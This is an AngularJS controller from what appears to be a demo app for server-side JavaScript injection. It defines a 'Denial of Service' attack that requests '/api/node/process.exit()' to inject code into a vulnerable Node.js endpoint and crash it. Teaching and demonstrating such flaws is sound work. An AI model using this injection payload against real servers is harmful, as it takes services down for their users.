'use strict';

angular.module('ssjidemoApp')
  .controller('MainCtrl', function ($scope, $http) {
    $scope.nodeAttacks = [];

    $scope.nodeAttacks.push({
      name: 'Denial of Service',
      info: 'Performs a Denial of Service attack on the Node.js Server by injecting a "process.exit()" command, exiting the server process.',
      attack: function () {
        window.location = '/api/node/process.exit()';
      }
    });
  });